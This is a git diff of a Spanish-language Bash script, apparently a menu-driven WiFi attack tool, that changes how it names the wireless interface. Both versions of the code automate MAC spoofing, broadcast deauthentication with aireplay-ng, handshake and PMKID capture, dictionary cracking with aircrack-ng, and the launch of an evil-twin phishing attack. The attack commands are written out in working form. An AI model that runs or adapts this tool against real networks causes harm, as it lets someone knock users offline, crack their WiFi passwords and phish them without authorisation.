@@ -47,7 +47,7 @@ handshake_ataque() {
 	clear
 	echo -e "\n${turquoiseColour}[*] Iniciando Ataque Handshake"
 	sleep 1
-	xterm -hold -e "airodump-ng ${tar}mon" &
+	xterm -hold -e "airodump-ng $tar" &
 	airodump_xterm_PID=$!
 	echo -e "$grayColour"
  	tput cnorm
@@ -60,10 +60,10 @@ handshake_ataque() {
 	kill -9 $airodump_xterm_PID
 	wait $airodump_xterm_PID 2>/dev/null
 
-	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap ${tar}mon" &
+	xterm -hold -e "airodump-ng -c $channel -w Handshake --essid $ap $tar" &
 	airodump_filter_xterm_PID=$!
 
-	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF ${tar}mon" &								
+	sleep 5; xterm -hold -e "aireplay-ng -0 10 -e $ap -c FF:FF:FF:FF:FF:FF $tar" &								
 	aireplay_xterm_PID=$!
 	sleep 10; kill -9 $aireplay_xterm_PID; wait $aireplay_xterm_PID 2>/dev/null
 
@@ -79,14 +79,6 @@ handshake_ataque() {
 		read -p "[?] Ruta del Diccionario al usar: " dicc
 		$cleancolor; tput civis
 		xterm -hold -e "aircrack-ng -w $dicc Handshake-01.cap"
-
-		echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
-		airmon-ng stop ${tar}mon > /dev/null 2>&1
-		sudo /etc/init.d/networking start > /dev/null 2>&1
-		sudo /etc/init.d/networking restart > /dev/null 2>&1
-		sudo systemctl start NetworkManager > /dev/null 2>&1
-		ifconfig $tar up > /dev/null 2>&1
-		sudo rm Handshake* > /dev/null 2>&1
 	else 
 		echo -e "${redColour}\n [!] No se ha capturado el Handshake"
 		sleep 2
@@ -96,7 +88,7 @@ handshake_ataque() {
 salir() {
 	echo -e "\n${redColour}[*] Saliendo y reiniciando la tarjeta de red...\n" 
 	tput civis
-	airmon-ng stop ${tar}mon > /dev/null 2>&1
+	airmon-ng stop $tar > /dev/null 2>&1
 	sudo /etc/init.d/networking start > /dev/null 2>&1
 	sudo /etc/init.d/networking restart > /dev/null 2>&1
 	sudo systemctl start NetworkManager > /dev/null 2>&1
@@ -114,7 +106,7 @@ pkmid_ataque() {
 	echo -e "${blueColour}[!] Recomendacion: 600 segundos (10 minutos)"
 	read -p "[?] Cuantos segundos quieres que dure la captura de los paquetes?: " seg
 	$cleancolor
-	xterm -hold -e "hcxdumptool -i ${tar}mon --enable_status=1 -o Captura" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
+	xterm -hold -e "hcxdumptool -i $tar --enable_status=1 -o Captura" & # --filtermode=2 --filterlist_ap= -c  Futura actualizacion
 	hcxdumptool_PID=$!
 	sleep ${seg}; kill -9 $hcxdumptool_PID; wait $hcxdumptool_PID 2>/dev/null
     echo -e "\n${redColour}[%] Capturando Hashes\n"
@@ -210,7 +202,7 @@ menuforce() {
 # 4) ataque
 evil_ataque() {
 	clear; echo -e "\n${grayColour}[*] Iniciando Ataque evilTrust by S4vitar..."
-	airmon-ng stop ${tar}mon > /dev/null 2>&1
+	airmon-ng stop $tar> /dev/null 2>&1
 	sudo /etc/init.d/networking start > /dev/null 2>&1
 	sudo /etc/init.d/networking restart > /dev/null 2>&1
 	sudo systemctl start NetworkManager > /dev/null 2>&1
@@ -224,7 +216,7 @@ evil_ataque() {
 # 5) ataque
 scanner() {
 	clear; echo -e "\n${greenColour}[*] Iniciando Scanner de la red"
-	airmon-ng stop ${tar}mon > /dev/null 2>&1
+	airmon-ng stop $tar > /dev/null 2>&1
 	sudo /etc/init.d/networking start > /dev/null 2>&1
 	sudo /etc/init.d/networking restart > /dev/null 2>&1
 	sudo systemctl start NetworkManager > /dev/null 2>&1
@@ -267,7 +259,7 @@ else
 	programs
 	clear
 	echo -e "${turquoiseColour}"
-	echo "  _       __  _   ____  _      ____                                __      __ "
+	echo "  _       __  _   ____  _      ____                               __      __ "
 	echo " | |     / / (_) / __/ (_)    / __ \ _      __  ____   ___   ____/ / ____/ / "
 	echo " | | /| / / / / / /_  / /    / /_/ /| | /| / / / __ \ / _ \ / __  / / __  / "
 	echo " | |/ |/ / / / / __/ / /    / ____/ | |/ |/ / / / / //  __// /_/ / / /_/ / "
@@ -284,14 +276,17 @@ else
 			echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
 			echo -e "\n"; read -p "[?] Que tarjeta deseas usar: " tar
 			$cleancolor
-			tput civis; echo -e "\n${redColour}[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
 			airmon-ng start $tar > /dev/null 2>&1
-			ifconfig ${tar}mon down && macchanger -a ${tar}mon > /dev/null 2>&1
-			ifconfig ${tar}mon up
+			clear 
+			echo -e "$blueColour"; iwconfig | awk '$1~/^[a-z]+[0-9]+/{print $1}'
+			echo -e "\n"; read -p "[?] Confirmacion de la targeta (Poner el nombre tal como sale): " tar
+			tput civis; echo -e "\n${redColour}[*] Se esta iniciando el modo monitor y cambiando tu dirrecion MAC en $tar\n"
+			ifconfig $tar down && macchanger -a $tar > /dev/null 2>&1
+			ifconfig $tar up
 			airmon-ng check kill > /dev/null 2>&1
-			echo -e "\n${yellowColour}[*] Nueva direccion MAC asignada: $(macchanger -s ${tar}mon | grep -i current | xargs | cut -d ' ' -f '3-100')"
+			echo -e "\n${yellowColour}[*] Nueva direccion MAC asignada: $(macchanger -s $tar | grep -i current | xargs | cut -d ' ' -f '3-100')"
 			echo -e "\n${greenColour}[*] Ya tienes tu tarjeta preparada!\n"
-			tput cnorm; read -p "[?] Quieres hacer un ataque? [Y/N]: " rps
+			tput cnorm; read -p "[?] Quieres ir al menu ataques? [Y/N]: " rps
 			tput civis; $cleancolor
 			if [ "$rps" == "Y" ] || [ "$rps" == "y" ]; then
 				while true; do
@@ -306,8 +301,8 @@ else
 				echo -e "    #"
 				echo -e "   #"
 				sleep 0.5
-				echo -e "${blueColour}\n[+] Targeta de Red: ${tar}mon" 
-				echo -e "${blueColour}[+] Direccion MAC: $(macchanger --show ${tar}mon | grep "Current MAC" | awk '{print $3}')"
+				echo -e "${blueColour}\n[+] Targeta de Red: $tar" 
+				echo -e "${blueColour}[+] Direccion MAC: $(macchanger --show $tar | grep "Current MAC" | awk '{print $3}')"
 				echo -e "${grayColour}\n[+] Hacking Wifi\t\t[+] Wifiphisher\t\t[+] Cracking password"
 				echo -e "${yellowColour}\n1) Ataque Handshake\t\t4) EvilTrust (S4vitar)\t5) Ataque Fuerza bruta (.cap)"
 				echo -e "2) Ataque PMKID\t\t\t\t\t\t6) Crear diccionario hasheado (Rainbow taibles)"
